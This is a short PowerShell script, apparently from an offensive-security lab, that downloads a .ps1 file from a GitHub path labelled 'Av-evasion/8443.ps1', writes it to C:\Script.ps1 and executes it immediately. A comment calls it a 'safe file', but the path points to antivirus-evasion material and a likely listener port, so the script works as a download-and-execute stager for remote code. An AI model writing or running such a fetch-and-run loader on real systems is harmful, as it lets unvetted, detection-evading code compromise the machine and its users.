# URL to download safe file
$scriptUrl = "https://raw.githubusercontent.com/salahgeek/LAB/main/LAS/Av-evasion/8443.ps1"
# Download script
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get
# Save the script to a file
$scriptPath = "C:\Script.ps1"
$scriptBytes.Content | Set-Content -Path $scriptPath -Encoding Byte

# Run the script
& $scriptPath